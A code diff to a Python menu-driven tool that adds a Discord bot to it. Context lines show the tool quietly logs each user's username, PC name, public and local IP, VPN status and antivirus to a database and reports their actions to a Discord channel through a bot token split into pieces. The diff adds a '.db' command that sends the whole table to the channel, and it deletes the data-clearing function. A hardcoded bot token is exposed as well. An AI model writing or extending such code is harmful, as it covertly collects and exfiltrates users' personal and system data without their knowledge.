@@ -17,6 +17,8 @@ import ctypes
 from colorama import Fore, Style, init
 from docx import Document
 from datetime import datetime
+import discord  # For Discord Bot
+from discord.ext import commands
 
 init(autoreset=True)  # Automatically reset colors after each print
 
@@ -26,6 +28,9 @@ TOKEN_PART2 = 'Gqe9R6'
 TOKEN_PART3 = '6FxrSF0yzRFtvp_61nYt23M_M76GSL6FCc7GrE'
 DISCORD_BOT_TOKEN = f"{TOKEN_PART1}.{TOKEN_PART2}.{TOKEN_PART3}"
 DISCORD_CHANNEL_ID = '1280446406783402015'
+
+# Initialize the Discord Bot
+bot = commands.Bot(command_prefix='.')
 
 # Database configuration
 DB_FILENAME = "ketm_user_data.db"  # This file will be created in the same directory as your script
@@ -84,15 +89,6 @@ def update_user_data(username, pc_name, public_ip, local_ip, vpn_status, antivir
 
     conn.commit()
     conn.close()
-
-def clear_user_data():
-    """Clear all user data from the table without deleting the table."""
-    conn = sqlite3.connect(DB_FILENAME)
-    cursor = conn.cursor()
-    cursor.execute('DELETE FROM user_data')
-    conn.commit()
-    conn.close()
-    print("All user data has been cleared from the database.")
 
 def get_public_ip():
     """Get the public IP address."""
@@ -625,6 +621,24 @@ def run_background_thread():
     monitoring_thread = threading.Thread(target=background_monitoring, daemon=True)
     monitoring_thread.start()
 
+@bot.command(name='db')
+async def fetch_db(ctx):
+    """Fetch user_data table from SQLite and send as a message."""
+    conn = sqlite3.connect(DB_FILENAME)
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM user_data")
+    rows = cursor.fetchall()
+
+    if rows:
+        message = "ID | Username | PC Name | Public IP | Local IP | VPN Status | Antivirus | Run Count\n"
+        message += "-----------------------------------------------------------------------\n"
+        for row in rows:
+            message += f"{row[0]} | {row[1]} | {row[2]} | {row[3]} | {row[4]} | {row[5]} | {row[6]} | {row[7]}\n"
+        await ctx.send(f"```{message}```")
+    else:
+        await ctx.send("No data found in the database.")
+    conn.close()
+
 def main_menu():
     username = os.getlogin()  # Get the actual username
     pc_name = os.getenv('COMPUTERNAME')
@@ -695,4 +709,5 @@ def main_menu():
             send_discord_message(f"User '{username}' made an invalid menu choice.")
 
 if __name__ == "__main__":
+    bot.loop.create_task(bot.start(DISCORD_BOT_TOKEN))  # Start the Discord bot
     main_menu()
